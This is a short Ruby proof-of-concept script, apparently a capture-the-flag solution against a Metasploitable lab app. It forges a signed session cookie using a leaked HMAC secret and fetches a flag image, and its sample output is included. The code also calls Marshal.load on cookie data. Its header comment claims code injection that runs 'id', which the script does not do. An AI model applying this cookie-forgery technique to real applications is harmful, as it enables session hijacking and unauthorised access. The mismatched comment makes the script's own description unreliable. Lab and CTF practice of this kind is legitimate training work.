#!/usr/bin/env ruby

#
# This PoC will inject Ruby code in our vulnerable app.
# It will run the system command "id", and save the output in /tmp/your_id.txt
#

require 'openssl'
require 'cgi'
require 'net/http'
require 'base64'
require 'digest'

SECRET = "a7aebc287bba0ee4e64f947415a94e5f"

http = Net::HTTP.new('172.28.128.3', 8181)
req = Net::HTTP::Get.new('/')
res = http.request(req)
cookie = res['Set-Cookie'].scan(/_metasploitable=(.+); path/).flatten.first || ''
data, hash = cookie.split('--')
obj = Marshal.load(Base64.decode64(CGI.unescape(data)))
sid = obj['session_id']
puts "[*] Obtained session ID: #{sid}"

puts "[*] Using stolen SECRET: #{SECRET}"
puts "[*] Modifying _metasploitable cookie to 'six of clubs'"
data = { 'session_id' => sid, '_metasploitable' => "six of clubs" }
dump = [ Marshal.dump(data) ].pack('m')
hmac = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, SECRET, dump)
cookie = "_metasploitable=#{CGI.escape("#{dump}--#{hmac}")}"

req = Net::HTTP::Get.new('/flag')
req['Cookie'] = cookie
res = http.request(req)

File.open('6_of_clubs.png', 'wb') { |f| f.write(res.body) }
md5 = Digest::MD5.hexdigest(res.body)
puts "[*] 6_of_clubs.png downloaded."
puts "[*] 6 of Clubs MD5: #{md5}"

=begin
 $ ruby get_flag.rb 
[*] Obtained session ID: e3d1958384f27cc5f16424f060c480ff28048ebd4bff3f338d00f045ff308752
[*] Using stolen SECRET: a7aebc287bba0ee4e64f947415a94e5f
[*] Modifying _metasploitable cookie to 'six of clubs'
[*] 6_of_clubs.png downloaded.
[*] 6 of Clubs MD5: d9247a49d132a4f92dcc813f63eb1c8b
=end
